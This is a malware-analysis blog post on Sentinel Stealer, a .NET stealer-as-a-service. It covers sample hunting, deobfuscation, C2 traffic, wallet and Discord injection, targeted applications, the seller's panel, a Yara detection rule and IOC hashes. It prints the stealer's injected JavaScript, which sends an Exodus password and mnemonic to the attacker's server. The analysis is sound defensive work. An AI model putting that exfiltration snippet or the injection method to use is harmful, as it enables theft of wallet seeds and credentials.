---
title: Hunt and Analysis - Sentinel Stealer
author: Tufan Gungor
date: 2024-01-21 00:00:00 +0800
categories: [Reverse Engineering,Malware Hunting]
tags: [reverse engineering,malware hunting]
math: true
mermaid: true
---

# Part 1 - Sentinel Stealer || Stealer as a Service

On January 19th, the Twitter account [@FalconFeedsio](https://twitter.com/FalconFeedsio/status/1748260587627495540) reported the discovery of a new stealer, known as `Sentinel Stealer`. Although there were earlier mentions on YouTube and the stealer's website, our examination begins with the information provided by [@FalconFeedsio](https://twitter.com/FalconFeedsio/status/1748260587627495540).

![Untitled](/assets/img/sentinel/0.png)

A quick search on Google using the keywords 'sentinel stealer' leads to a website named `sentinelware.net`. This site serves as a marketplace for selling the malware and a hub for collecting logs. It offers options to `Register`, `Login`, and `Purchase`, along with a link to a tutorial video on [YouTube](https://www.youtube.com/watch?v=4_UBrd_FIgM).

![Untitled](/assets/img/sentinel/1.png)

The website for Sentinel Stealer lists its key features: 

- Browser Recovery
- Communication
- Crypto Recovery
- Game Recovery
- FTP/SSH Recovery
- Wallet Injection
- Electron Injection
- Dotnet Injection

# Part 2 - Dissecting the First Sentinel Sample

Our next step involves finding a malware sample associated with the `Sentinel Stealer` by searching for the `sentinelware.net` domain on VirusTotal. This will allow us to explore its network of relations. As a SAAS (Stealer as a Service) platform, it is highly likely that we will find malware samples connected to this domain, which we can then analyze in detail.

In our analysis of the `Relations` tab for `sentinelware.net` on VirusTotal, we identified 69 files linked to this domain, as of the time this article was written.

![Untitled](/assets/img/sentinel/2.png)

Let's choose one of these files and begin our analysis.

**SHA256: *b177f7a7c764f96b6f60eea74014b18af23129f92c9ed34a76a46a0e111b5e26***

*Exeinfo output for SentinelDummyMalware.exe*

`MS Visual C# / Basic.NET [ Obfus/Crypted ]`

Exeinfo indicates that the file is a .NET application, so we open it in `DNSpy` for analysis. However, we observe that the class names, function names, and other elements in `DNSpy` look like garbage, indicating potential obfuscation.

![Untitled](/assets/img/sentinel/3.png)

By running `de4dot` on this obfuscated file, we successfully deobfuscate it, revealing more readable and understandable names.

![Untitled](/assets/img/sentinel/4.png)

Across different Sentinel Stealer samples, we observed a recurring theme: numerous resources bear the 'costura' prefix, like 'costura.costura.pdb.compressed.' This consistent presence of Costura-prefixed resources is indicative of a deliberate strategy to embed and compress critical dependencies within the malware, enhancing its stealth and hindering straightforward analysis.

![Untitled](/assets/img/sentinel/5.png)

In our analysis of the first function within the Main module, named `Class5.smethod_5()`, it's observed that this function retrieves the `MAC` address and `public IP address` of the device. This data is then sent to the `/AntiScanner/VirusTotal` path on the C2 server. This approach is part of a strategy employed by the threat actor. By uploading over 100 `SentinelDummyMalware.exe` files to VirusTotal, they aim to gather IP and MAC data from VirusTotal's virtual machines. This data collection is a strategic move to develop targeted anti-analysis techniques specifically for VirusTotal.

![Untitled](/assets/img/sentinel/6.png)

After examining this file and several other samples for comparison, we identified a more informative version for analysis. Recall the `Stealer-cleaned.dll` file from our VirusTotal investigation – this file encompasses a broader range of functionalities. Therefore, instead of focusing on `SentinelDummyMalware` files, we will shift our analysis to `Stealer-cleaned.dll`.

**SHA256: *4e8cb27f3b3b7ddf9e4276aa2902f25c37d12dc5e5ba54a7b9e2f190bfea96fc***

The suffix `-cleaned` in its name suggests it has already been processed with de4dot. We can confirm it in DNSpy.

![Untitled](/assets/img/sentinel/7.png)

Let's start by analyzing the `Class10.smethod0()` method within `Sentinel Stealer`. This method is designed to create a folder in a randomly selected location, using a predefined list. It first selects a random directory from `Struct0.list_1`, which contains only the `\AppData\Local` folder. Then, it picks an option from `Struct0.list_2`, which includes choices like `'Microsoft'` ,`'Microsoft OneDrive'` and `'Intel'` . After establishing the primary folder location under `\AppData\Local`, the method proceeds to prepare paths for various subfolders, specifically named `'Browser'` , `'Communication'` , `'Crypto'` , `'Game'` and `'FTP'` . These paths are set up for organizing different categories of stolen data, although the subfolders themselves are not created at this stage.

![Untitled](/assets/img/sentinel/8.png)

In Sentinel Stealer, **`Class8.smethod_0()`** represents an asynchronous operation, a technique used to improve program efficiency. We will now analyze this method to understand its role and functionality within the malware, particularly focusing on its contribution to asynchronous tasks and how it fits into the stealer's overall process.

The **`Class8.smethod_0()`** method initially reads data from a resource named `Sentinel.EncryptedIcon`, which is encoded in base64. This data is intended for AES decryption. To proceed with decrypting this resource data, our next step is to locate the AES Key and IV (Initialization Vector), which are essential for the decryption process.

![Untitled](/assets/img/sentinel/9.png)

To obtain the AES Key and IV values from the C2 server, the malware constructs an HTTPS request targeting the `/SentinelC2/GetKey` path. This request includes two parameters: `shh` and `username`. The `shh` parameter is an integer that appears to be randomly generated. In contrast, the `username` parameter is derived through AES decryption of a separate resource named `Sentinel.SmallerEncryptedIcon`

![Untitled](/assets/img/sentinel/10.png)

Given that the AES Key and IV values are hardcoded within the malware, we have the capability to manually decrypt the encrypted resource. This allows for a direct approach to uncovering the data concealed within the `Sentinel.SmallerEncryptedIcon`

![Untitled](/assets/img/sentinel/11.png)

We discovered that the `username` value used by the malware is `ConorJames` . To observe the malware's network behavior, we could run the sample and monitor the generated traffic. However, since it uses HTTPS, this traffic would be encrypted. An alternative approach is to run the sample in a debugger, force the traffic to downgrade to HTTP, and then use tools like `fakedns` and `netcat listener` to capture all the POST requests. While reverse engineering could provide insights into how these requests are created, the complexity of the code, as showed in the included screenshot, makes this a challenging option.

![Untitled](/assets/img/sentinel/12.png)

After executing the malware in a debugger and successfully downgrading its traffic from `HTTPS to HTTP`, we were able to capture the details of the POST request it generates.

```text
POST /SentinelC2/GetKey HTTP/2
Host: sentinelware.net
Content-Type: multipart/form-data; boundary="f22be721-0ba4-47bd-b412-1bc1ba7a028c"
Content-Length: 329
Expect: 100-continue

--f22be721-0ba4-47bd-b412-1bc1ba7a028c
Content-Type: application/json; charset=utf-8
Content-Disposition: form-data; name=shh

547560
--f22be721-0ba4-47bd-b412-1bc1ba7a028c
Content-Type: application/json; charset=utf-8
Content-Disposition: form-data; name=username

ConorJames
--f22be721-0ba4-47bd-b412-1bc1ba7a028c--
```

*Unfortunately, as of the time this article is being written, the C2 server is not responding to our GetKey request. This lack of response means our malware sample is unable to function as intended. Additionally, there are no other operational samples available on VirusTotal. Consequently, our analysis will proceed by bypassing certain aspects of the malware that require the AES Key and IV from the C2 server, focusing instead on dissecting and understanding other functionalities of the malware.*

Sentinel Stealer stands out from standard stealers with its support for `Electron` and `Wallet Injection`. If enabled during the malware's build process, it can unpack `.asar` packages and inject malicious scripts, adding a sophisticated layer to its capabilities.

As you can see in the screenshot, Sentinel Stealer checks for the existence of an `app.asar` file in the `Exodus` installation path. If this file is present, the malware unpacks it and injects a malicious script. The purpose of this script is to steal sensitive data such as the `Exodus Password` and `Exodus Mnemonic`.

![Untitled](/assets/img/sentinel/13.png)

The malicious script injected by Sentinel Stealer is programmed to transmit the stolen data to the `/SentinelC2/Exodus` path at the C2 server's address.

```jsx
const request = new XMLHttpRequest();
const url = "https://sentinelware.net/SentinelC2/Exodus";
request.open("POST", url);
const formData = new FormData();
formData.append("ExodusPassword", e);
formData.append("ExodusMnemonic", this._seed.mnemonicString);
formData.append("username","%USERNAME%");
formData.append("uid", "%UID%");
request.send(formData);
```

If activated, Sentinel Stealer can also target `Discord` by injecting malicious code using a technique similar to the one described earlier.

![Untitled](/assets/img/sentinel/14.png)

Although the original code of this script is extensive, over 600 lines, a brief summary of its functions is more practical. It's programmed to capture sensitive data during user activities such as `logins`, `sign-ups`, `credit card records`, and `password changes`. The script then sends this stolen data to the C2 server via the paths `/SentinelC2/Injection` and `/SentinelC2/CDN/Injection`.

![Untitled](/assets/img/sentinel/15.png)

Since the remainder of the file exhibits standard stealer characteristics, we'll skip the detailed analysis. It's designed to steal browser data, FTP/SSH credentials, wallet data, and more. Below is the list of applications specifically targeted by the malware for data extraction.

**Wallets**

- Exodus
- Electrum
- Bytecoin
- Guarda
- Coinomi
- Armory
- Zcash

**Games**

- Growtopia
- Steam

**Browsers**

- Chromuim
- Google Chrome
- Edge
- Opera GX
- Opera
- Iridium
- ChromePlus
- 7Star
- Cent Browser
- Chedot
- Vivaldi
- Kometa
- Elements Browser
- Epic Privacy Browser
- Sleipnir
- Citrio
- Coowon
- Liebao
- QIP Surf
- Orbitum
- Comodo Dragon
- Amigo
- Torch
- Yandex
- 360Browser
- Maxthon3
- K-Melon
- Sputnik
- Nichrome
- CocCoc
- Chromodo
- Mail.Ru Atom
- Brave Browser
- Firefox

**Communication**

- Discord

**FTP/SSH**

- FileZilla
- WinSCP

In its final operation, Sentinel Stealer obtains the public IP address of the infected device by sending a request to `ipapi.co`. Following this, it compiles and compresses all the collected data into a zip file, which is then transmitted to the `/SentinelC2/ReceiveVictim` path on the C2 server.

# Part 3 - C2 Panel

Sentinel Stealer operates as a `Stealer as a Service` platform, centralizing all logs on the same C2 server. Users of this service can access the C2 server by registering and logging in with their purchased license key. Lacking a license key ourselves, we will instead analyze the C2 server's inner workings through a YouTube video shared by the developers for promotional purposes.

![Untitled](/assets/img/sentinel/16.png)

In the video, the threat actor demonstrates an attack simulation on themselves, encompassing the creation, download, execution, and analysis of their own logs using `Sentinel Stealer`. Key features observed in the `Builder` tab include:

1. **Log Selection**: Users have the option to choose which types of logs to steal. This is customizable through enabling or disabling various categories like Browser, Communication, Crypto, Games, FTP/SSH, Discord Injection, and Wallet Injection.
2. **Persistency Methods**: There are choices for persistency methods available, such as Electron Injection and Dotnet Injection, allowing the malware to maintain a presence on the infected system.
3. **File Format Options**: The builder allows the malware to be compiled as either an .exe file or a .bat file, offering flexibility in the mode of distribution and execution.

![Untitled](/assets/img/sentinel/17.png)

In the malware building process depicted in the video, the threat actor opts for the .bat file format and names the file `JefferyEpstein`, resulting in the creation of `JefferyEpstein.bat`. However, a subsequent search for `JefferyEpstein.bat` on VirusTotal yielded no results, indicating that this specific sample has not been uploaded or identified there.

![Untitled](/assets/img/sentinel/18.png)

After executing the `JefferyEpstein.bat` file, the threat actor proceeds to display the `Logs Manager` tab in the video, but the specific details are blurred for confidentiality. However, an inadvertent reveal occurs when the threat actor downloads and opens the zip file containing the logs. The file name, `Ramirez-DESKTOP-ZMNAUDV.zip`, is visible, inadvertently disclosing the hostname `Ramirez-DESKTOP-ZMNAUDV` associated with the logged data.

![Untitled](/assets/img/sentinel/19.png)

Despite the reveal of the hostname `Ramirez-DESKTOP-ZMNAUDV` in the zip file name, our subsequent search on VirusTotal for this zip file, or any other files associated with this specific hostname, yielded no results.

# Part 4 - Hunting with Yara

After thorough analysis and identification of unique characteristics in the related samples, we crafted a simple Yara rule. This rule was then utilized to conduct scans on both `VirusTotal` and `Unpacme`, aiming to detect similar patterns or instances of Sentinel Stealer.

*While the potential to refine our Yara rule exists with the emergence of new samples, the current rule is sufficiently robust to detect all existing samples of Sentinel Stealer available on the internet as of now.*

```php
import "pe"
rule SentinelStealer {
	meta:
		author = "tufan - @tufan_gngr"
		description = "Detects .NET stealer named Sentinel Stealer"
		date = "2024-01-21"
		references = "https://tufan-gungor.github.io/"
	strings:
		$s1 = "SentinelC2" wide fullword
		$s2 = "sentinelware" wide fullword
		$s3 = "SentinelSteals" wide fullword
		$s4 = "ipapi.co" wide fullword
	condition:
		uint16(0) == 0x5A4D and
		uint32(uint32(0x3C)) == 0x00004550 and
		(2 of ($s*))
}
```

Following the Yara scan, we identified a total of `291` results on VirusTotal and none on Unpacme. Of these, `290` files were identified as `SentinelDummyMalware.exe`, likely uploaded to gather IP/MAC data from VirusTotal's analysis environment. The remaining file was the `Stealer-cleaned.dll`, which we previously analyzed in detail.

In addition to our Yara rule-based search, we conducted searches using specific strings such as `this._loadLightningCreds();`, `/SentinelC2/ReceiveVictim`, and `/SentinelC2/Injections`. However, these string searches did not yield any new results beyond what we had already identified.

# Part 5 - IOCs

```
sentinelware.net
4e8cb27f3b3b7ddf9e4276aa2902f25c37d12dc5e5ba54a7b9e2f190bfea96fc
ff7d1147544d9e91b2c03c58469695692254b33288a2ae25aa7404c8ca9ec069
9c7294b588dc0e2f9c4a636cda2554d9436e9007a9af24244084ab6933101ec4
19c9e0a0e79b2ebca9d2e77ed846f07877ece61a939358b7048398df1c4f45e1
31b7626fee12b1726fcac8639c2bc7195a2077f797a9b9801d919d1aeb1e8dee
ba081cb2318784623fde159745c0ddf4adfa9a1286b4ab431555b8b37088f34a
eddf6fe81b326022d6e877e4b12cb76109b27a7598e6d01fefdb35a54125c439
aad0a196cb21bdefbab54a7a222a7c685e67f3d3f200c57a735ff2add8c195b4
fd85b80ee6b6cb308d0c75ae6f9d52eefdc865a26191c3ee0857612e3fbdf037
42a47c1ec52c68df4b0aa619df3918fdc2fae26abb1d0568f4aa29f049494f14
c82b80e1fed7a99a1a5ebeca496a6d065a9065549290770ceeb173940fdc6c63
26f07d0f3609779c90e80a1b6f3f0f6af1fcd04bc814deef6c148a90e91e4ccc
ee07489a210cae2bef2653a137a5a9fbb62acc579a37126ad0543964937840b0
9ae2875856a2d2e78829368abe82eb3f316e196e2d779525dc322fc85984de61
f6676dd3af90d3c93fddab9af9a65fd17bd8f42daf7bbffd71334d8c18f4fad1
a0c8269577438cc1965c02242f31956c6ec1de5533cd56978f9d31f201727fc7
49818b149adf3959ac5064a3e8c652c21bad91b0c0077a967cd18362b20fa69e
5a8be39f0c90d2a55cd716e697acea27c21f21f70499532b937f50d661eaf213
d60e20e2574615bbe8ee774bd5e581a2666b1cb5ebc71b58d97123472161082a
8199ab4ab4163a3cccb4feb9bd611f922b185711a6f3a603116311596efd2ee0
209151e45b72f309aa5f2cff4b96b6a149c54841ff2f9dff6d04b02cfcb8ccbb
0a883696bd427712c00eff6692e6fdc8357baeef71ea6a49064437fd93234531
5b33bdb25a5774fb479a500e05716c9d9ee7cbd63cf6f137a3d9458a88a0608c
0ef7a3e75cdd27eb88563c3e376b6769a14c05a0322a0da1a24cc9f5ca3eb017
18f7082d47183ba924816a1b677d8f7ad29bbb29e9b07b00c3503cef68b297e4
28016860c2768a9c31408ad6573335099094ab557675d26fc31e37393b13b1f9
75a9ca5c2954ac6ed17f6dcd292a19cd88b9d8dec6f94bf99d408aab29631b86
27d9f78b1853c29af717ba5976e8b5d6b571be72da306a6757739eb2724170f7
5be510271bd9388cc5d7e5ba7df6eb1b3b1e4c4043b8b3ced5c169d62ab55e0f
9010a3b3b0d2fb142df25a5e37c72d4e2d619cc3c6a609443a6c3dd698fefe6a
9dea7d77ae493cab1d2be61c60231a7dfea1a73ad04b3c2131ca1a4424b7afe7
8380161058c2ce4266565fb0a09dcc2ae7e31a5c857771d8e075d2249f565dda
178d1386250ad436d9fa5bed387bdc4f6b30a6fec9cf28400d3641a6d3a35b14
f9ac15adf927a1cf59cb1ed0c554a546cf8650e4cd85f0aae3b8f9bac41e550c
847b268fae6a02f76691eb4e62a7abb1479aff0c5e0e4cb0733e75e5a36a95f2
4f89e2ccf89a332fff2f684f590fa6ac21fa38a9afb3f5f9c919dc46d4de9c46
f28b5d89be9f2046652c693ba80747db3054ba40301016903cc6f7271696532d
06f492d90267fbad9f38c7d03a7405fba71f94f151dbfaea3ed3297041036224
c8cffa9fb82aba8dac5a80a8bc4ad75564513dc2be42083a22e1f9bab2bcb1a7
16aa16f241903dab5489ba5c24c6cc65996d5c1d50870c94ca194de533cb3363
9710924a430795de214cc470685d3bb30ab1a5bcbb16f9de33db194f0a282d49
8e82a678bbbc9f37f1042397bf7d0e2271fe7abff6d679c0e09d454b0c0e049c
c236581342285fb5952c477ae859f5131c38815991a22d480e6e67b1f5e08c75
8846f5c0e5d91ea159b7a812f269ae3823a9e59b10e737bd4db816c15d503d80
04e23d374fb85a6d6d3e51ee6fd1496c0231e5f45dfcdab50f68697f0e32724e
0ea502bfde2fd033b97bfa057d5c7d59795764139848142a161ed8e4e2228d7b
72e229c736a80f5e975de02561cbecf74bfccdfefcc5af3449b104b09f11a3d4
afc4090514971262d008ea3814e49f810c882f62d694cc05e97dc6d9eb674c47
808b2a99af0b283d4e39ebf01cfb995309441546d5744b78cd88f3f39010551e
ba91c73422400c6640ef39640a196bd91d1b4d418ae9eaa19d2bf3d06860c863
44aa2c084681a29f7ca44b531fc7a21bd72d23fc648f2af1762466db6cfb66c7
feed1174e84b53dc9a8220440e37c4795f773811996a4df125f4db42f9ad4835
51a51202734582e8604c0721e2419f75a2335bcf429baf431bc6a54317c6304b
856e8efe2586721c89ec4c6dec15aa59020633fb0fe6f47237b0a6f7517cbf2d
5f971d02b39d50921c91503caa7ec9ae8368836c6a05090b19919b53c430320e
3ac735db81b628445259be02c6f56c1da6528bf7537fc0da584822f1d744c40b
da389698e9ae8f605334479bb27dbc10d2cc584e09fd8e88d609027edd110b9e
72c27936087a8dc73b4b20a9b055d4de1147c077e112051398b461005d20211d
c2a83bdb4db34afaa69cf2003d545da06552ac569e74ed657edc1792385f36e7
5a9ea6194d057c27a73c94f78620a277f5edc3c8d151c02ec79ab2e67899fd46
5da6c7fe8e07e0b4f0af30bf21f63774de8f5d94e3d87187fcba1262b19cace8
5d9a5bba95fff7ed790fd6ec3d8f81d8a43fe27738eb09a3c7d09190022ae76c
495f9cfe737c2e2fe9972d5eb62fa6a69a5a5e711b92bb78483665f0856b0a21
030bf2e40033578f4e5a0d781817b48a706cd8ab14c77681c2d49eb7dae733dd
23a3a9f08381655cc879c9ba28edbda03bbf0af42ccd71127e70289ab0fcad78
b4a010c98acdcb8da2bfe67919753e2a0f42971d472b8e486e3a5d20086b1c17
1018a6a0e72d9e64ba9d5c88befc1c1ecccf2eae1108da917d55258c03c9988e
135465c15cfa777895084d7ac7287d699a0554ff7ff3ca71f4eb8dd4d8243b62
4aed739b14d02c1c90f567272771c45c5c3ca5c4a0fa89ae83f6d8433193ce95
d5d452d4f671d5b2167d8d9f5bd0b3e675e310b7ef6cce3fda56d95ce142fb7b
36c51e5c7c83587cf52f9d265a049b10ca74795bbca19fe9ce74f4e83d176745
83330a62767d3cbbbefbb0bb61e85cc589ea13e80782fb9fc4af235cac9dfbb8
26e377d4625c7fd5d412c1728bbdb551620307f0b58e703684ad9b9cc5f10ecd
824ede8d6b1bbf5271b27381145be89f9da83ee7021468523f94a2585f4a2860
a98c5e38d5da9898ce27a12f632a9381419b4425a12baef1573efeefb1ae3b2c
3c73732692aa973f0c851f397a5815502fa143a7dc9c0467e1bbdee490715ed4
d3b5475e6d8bcf97e26af8755f4a09df2246b099ea5049a8e1b99a934e0be725
95175beaed153b5b16e652dcd497e543943d27ea15228732b8ace1c154465bf7
196e20b9bb461503761e75f90915b59d25af3442b39aaf1550853f69f20c2f14
02196c7cf6b4ddfde6317bfcd514ebfebabcd1f90f7b78bcdf197c065300d441
0c6a8249e06b5eb1a2661517115151574ffdd7cdae3d823984bb7ae30be279a9
058653c25727e559602e2b62212442875219144cd5762c12b56caaf5ac102514
55ddec784eddc4478be59f3055c273c16dd65256d120d91cfb3c8000cad728e7
2f8fc63acf8764679991910b37668d3c3d7684ab02fa2c733985d20099c4f7dc
dbae5d4842421f96f3f197b5f04f7d123ad871a781950b85792f6339bd7645ef
2a6b8bc4b4a55bd530f2a6d5f2e012ae71a462fadf8bb52319d908a7277507fa
0d9fc08b1aab3c2ef22e531d18c73185fb26642df32b1c292561b6eb64ba79ad
1b1559403da506db062845e63d22bd957c50dad45735f15735bfd6e54bd19c34
dd6fb40a4968ee0dea119f60008b1d50a92463aec19daf14718b4315a6bc5094
cf5f8d28fc40b5204307f16ed12fabf044f0a2217fc3a7024201cdf34c045689
8b74485fdbfd5daf74d8a3f668f105b9151f1cdcfa49068688809e849b2ed9f1
0bda3d3932aaf1cb8dbb14783eb1a575f7e798d64b56fd76d837c9113cb5c65d
c5617f6e9d1dd58b41fc9562642c58231e7d9fbbc6d28f5ff22cf775fe4d427a
b7d4b10946fe8983be1dd2d88ca5d10e29eba8ea384e271097b6e7ddcdd21f1b
e8a3cc6fa733fd1f7cce0b864249ebef4b418762179ff8fb37854a77b552d864
086ee8232be5036dc85d2a0378f8a67e474e8e356e152ffae942d381e15b8aa3
8c2cd9f1ca854efb85bb6dcdddb3b559d1359d898c3a71de68c708ab652b0d4d
58b5043edf545f40445d16477d56e3fb166ac15a6810c5ce8eb8c5911ec1efc1
7fb4f2dd2c3947ddb349a8954058e831d937b095e57507c859ec9466d26e3a01
79cb75a4345abc273db979a1d0c13b7ef8decc312e2b599fc4417e682744b6b5
2ac1bfbd059fb7a163e481f488ee8b903482ced42e20bba9da8c06dad7785b2b
7bbfd95ebac73a464ecfe7e3557f6c194c6fd42fe2f90bb011b724ec6147f727
2b28f63edcc19f39623f8ccabef8af7eb4f8a79fd51864aad542e21b54e56cd4
95287c6eca909dd5e32cfad65e6ac0e1df93ca7272eb8525b16ca73d6e751b79
b4943a73e5bc539a7b696e5d59de7ee668da17784a85f8c9d1179a57ff44cef9
4f15e2d01f8d4cf5a31065beca0322d05f5fd21ee4e6afce5de9f823f94994e1
1f956d9d6a10065ef4243658fe604d4578faceb9e9b7ddecff0c465851981a63
52428834b2090652d2460f48f634dc2d70878a48e0b12109ac4d6794018be719
e24507dc40ccdef2de225e6dd12363fed3673ba1974e56a6e333afdbc1427c76
635ac9a5252bebefd1c1f63cf98a2b502489d634394add450babf9c402a94755
58b350c64a227f7db6595e7a62f9095f0b452470de038c8f84bba1448834da83
cd1bebf4773c1a65c409bdd8a676487965d3072b51d7ae3e9e8dd96590cfe951
d351e3d13d1f6f4f88967dc65a9af9475296b360f231c6470ffef4a21f8d77d7
2d23e5e671b2873402abd966ef9ca6c452587cd7e09e19f698d3813d63f6260d
ab5b245c0c2d38ea4635d66f53bf6119a3c0721b02108e3b5df2791c62f88358
2de94cabd7bd2ab0a280606ce7fde353cde7a8028f16a5cb6ca61abafbcf6441
85f950a2aafb8681150a23112be8be54d7c9e3eb1580ba0a6d0f239507794ab5
28203a33e4a4a3c4fe190dbe454f17d35a9f24a83d1c67f586fd0ae80a889c61
bff6207642f790adf221bb659fcbb4b2b40d6debf6a98be7da803609248f75a8
7939903704efcf0c9b2088409052540a32fdcbca086b0f4957a911273ea6c81c
f3d33b593b9601549805f9d9941c4df886c06be6324dfb9ff3ae0f523645a7db
5ddf6dfdabc7f3fa1ed65a9ce3663d70846af3f5b92e49f3db1a00f999fbdabb
88191be061a8dfc4a0547be4b3f7f1a935ece795b1d89f636cc27c69a19c77f9
6c70d8bdf6cc64217ef7f13072e4cbec05b62c5b72fee2e2522b3ee22778f8c2
831fb6dfc38e9071cd9afda7549707cfcdc696ba8d7e8d28357db740bdc54f20
6ed0c9c0d169440f7acfbd44b2fd2eec6b01922fbd767b047e035700a86eaa1a
2c08c3c83ee69efa2f2fcfbcbe7de6d2b3bdb3b503ae0dd77f293d9b4b05b836
8dae6968af28b5177507da49961a70dd4759015532ef021cbd70669bb03d1791
339037033792d7bbe1bca813f151d3c66f847941437e6a5aea6b9faf9d51bf40
41e595c0d971bd3c248014d81522248e2245aa1ba703fd87c31f0aa4abeb2716
db3d9ee28507c73b7c83189765ff171dd41db367214d8e0d517d420f71b279c5
65ea838e69d6d92715f807e832ea5c696326eacd2689e7b0e5a49544c9f107bf
393ca77ba09323add818a4f6d13bd5a9dd803da92873dfdf176c412b024cc7e2
c8d00a89e1b0dcd232c1505fa8d54b3b5fcca57e35b0020a2785bfdcc29ed6fd
e6cd09b97693c83344222382b37aab7fb47336d5174d516a6b9d3129657c3bcd
89e1ea9f49497957847c544bfb0793b4f6779a5822dd5451bcac233584fc4a96
2f2ca8c20f6523f33153477aef20d359c41a0291197dc2c6319d28af181deff0
836f9eea2f844d95af5d44cee0a9b3eaf6e45e4d7490b11d6e1b415d448f65bc
d5c87b6b4971c045a99427255c3f9741b4340bba7e2eaaa006cf6bd00ae3c97c
d8afd131d800921d8749dcf3c99191eecf9b260bc95aba4498734a0729337df9
b4adea5e2052da8971d63c9b1b0e2ed9993fbff66d797579cd2a8b65c8ae64ea
973998f790c753edee48393ee10e64b733f2c3d6bf8591ee9ed8c4552f2d57fd
5ffdc7769d9a9736a786f25402665527b7a134363d8e9f9f7c9a3637ad86faad
d63cec55c71743df186b1102254f1eeb2e387ff73477eb3b6f168b8bbdfe7a88
2db0e29a470b18fab00d3bc9bd2e4e739c23e3dd65729cafed38863f57415dc5
6ac6a75af62d1e62beea59726a80e796f41a29bee00e779b645fd56a3491f7ad
4c7c4744d105b8bac55892b9e1a851342964606f471624046a51d88c4f641b89
e63d7922f2f22ea12cc4f838d0cfc91e54160b60160fc2566f66120a70423215
38780d0211f816447ae91ec7cbaba6d9a3323fc050959e82adc52f446387569d
99a62bcb6e66b860aa7017c468e4ff1bf9754dc7a377801050bd5f5fab6295f5
156f0d3bd951764af025b0d03d4ca893ae43c46a5f45c69a3458c266636c69d9
3a0f2dea0394614e3feb61370e302316af63593ee023cfd6c9771bc00cbbc601
fcb058a1bfa3333355108f8d299cee6a19ef18b80ed16691c6f075a5ca119b01
f3bf733b8bade69f4ab0d163cd19fc0daf92517f28af5368540a5cf24d63a835
8f4582f415c087a2a3da286a87d7e6ce254fff67fac8e9c2475f75dc01f0e044
ec128f40e25f08c32d7438a805b7ae7afc3ee95e2c4018ad5254764b9953ab2e
b67da5ebcdfa75ac83108b54fe1468e3acdbcb1e0c7c186cd95ca340cb425f24
08d317e494ea8e3c40fa554550f4e04b955b915464f329cf199db5a754131c4f
f6f800c666769351577053cebb21814aa2cae8d024238e01c29141b3b1f4a382
2d29d12e8e670a4ee430756480e681e75ce2f495e0eab11ac136f388e660729d
d6f8aafd471c43024e5b7ee10f9e1c3df2b607556b84bc9a92c540e59febfce3
2aab6d3b3efabaec992bc8a8eb7a45cdeba5102772faf1295a1b39a16e318e73
620d8de1e9903788a6ca5027a52dd5bf5b039a6fe0be06e01a79ec86cc678a4c
7fc11a4b3f67fc56cb4c3d57d743f35bedf1079e4775903e28a331e48f21052e
b24cfb6b58f0b7d4d97aee8aecced565d4e367be8637c7cc999a6bf549a0eeca
5cbf02e1e60ac4d9416ba785752dca13167cda32bc17cf2920849130d7ee0871
8f3f7f1c1ff0bee4a200f308506daf50cf90e5d27893b7525f3591f7c57ef8d5
c40505317714fc1ccee4bf9ce3d6827c1e4d7db57b7b6c20c06375091a3a41be
4d631a3cb554edf961f44b746429c9351047e137933e8dd2db64b2f1b4d5c1ae
87ccf30a1965f70005a36e838a43339f143b3103c3bd1a4f2ae2317dcbdc552c
25a542c972dd9ae5285cc13d32c59be88afea44690fe7036991a226f715d3cae
9ba06bda0eb69e216a3d6c0c4c6fa51a8e085d710b7fd2330a70e4cf1c122c14
df5fb36e65f729b5edf44c6198263871678b40b93c47214a886f94b5ff808957
dc7de8a2e7c5f97e0fbbe6677dd9b482962a016931921a8b8f62d91de833a08a
d1b93dd8f1bb80db6db5529e110c0a4673dc66bab03dcc5d55fde4b6d463069e
d88dfe831a829dcbb4d4503220e25693de832578538a0cc0f3515c0785ecc4c4
8bd613d58e0e6d30ff0e8294c036bfb38d78a9b9df1b63f41632bc7dc6291038
b39cc4fcf2eb6483221acf8ac3bb84157cc9170773c5c07744258960b6627a01
0d0c3a13404597f05f8f59ff3fa3a74a208e17ff03c9e79dca3865cd86538617
7715d06758527668c47908a0a23729b654a7403a393ab3cb4fca5b4c927072a4
727658f52fb06c25429598a6bad663c7a2ce1caba8c841a4f0880d2636ec43ac
59374b0c0f92dd619190d043b3d5130ad5982a750462f465e93ebff78dd50046
ff8be37f3b746c79d32f3544894eb253c07f184869aafcbb793e794a9dc4443a
936cb64f6d33f5df96ae670930e243a8d2dbac6f0802756dd6452ffebbbc39e7
c806382ba646aa7215b64d4a8c909a19fb18d72ff27ad332c65244e183ea1078
38c1f566efd56b44a5a3ebd422c90ec26d4734e37cd7cebf863459c5ac763709
14c1a62da20dbe552555435493565edbb596fcb58a6fda5465c9d9409f9eb42b
1934140a4a4f8a0dd9de88ed1c62e89ef3a0b6c2e905c165c9ecb2b663627cc9
70e6b755548b5569d734d4390c0ea017f69fa9bd9affb3d709233482b65d5271
fe9134c180bee9bdfb26a3edd7a2fd010fed7f6bb966b22fbe29424b92731524
4280d7b773019956cfba73df4bf5c36fae732228f901cb01426408856e1e1cf7
ade74cda6b85a60bf94d8a199d848a01af190d4413af4b247e8859bc683948e4
1b62a7c299a2718c5608ed96b4b898b961525e6f59ab5b40edf77078b256e18d
b3d197e9782936ef87187ce90986b561f8b92445a98fc9550d85c0791f4d3701
4268ccbc3a5909cad0ea01281022bfdd085fa5625017f23a5dbf71d0022f28c6
0baee680a93c7d4c803493b4d35930748376655a02b62cd2c159b042d241ede6
4a13c7e62469e215040af9a4da85ccd78f270b449a4d8b2077c90e61e4882460
e755c1b7f8dd72494b8b55cad396d62bae74cc7dda70e28084d2f3f4885b720e
19e29245b57e38170fb79b2ff42ae6ad32698c42a0d2fdbb16f73e7366967c05
ff81361ae96cfd876b9377af9a27467db9325e94bb6076d67a61a8848c011782
eb9b24913d20aed078290b025fe0951d71e91acb21b1f804e0bb498ef0d49a50
03224d849eafc7c76d1901d0ffefbc442b18f4808c1fcafcb20c5dfbf93e1642
48df26474b3550bd9bc3545a775ecc290fb4a6b76e85230b8e94e882cd4f2b21
e1efbdb4b7c71dcc46d97c0292037e359b83d1bcc386946090e9284742f2ebf1
e3e6bebc33860fd91f119aee12788c02d456a925465020d16b786b2d05a6d92d
eef3092851f063422a4bd19f8581d625c1e950f429798a4ff59920be05d22ca8
1ef7d5a7edad9f42faf16e325c2fba016e0dc6ccd836e29a2da7b6e19bb34144
ede8ae5ec88aad07c05c95712dcaf9a523fdbfc4ddbc0ee4ba50952bdd548cf5
4a14b6f827e5b0d9cb9d38e93b84e89f7b1dad9aafc8eaf138e36443488670a9
86ae3decd9aa892416b66c453606a3ffa7bc1967ad21535286a608ac29c08a15
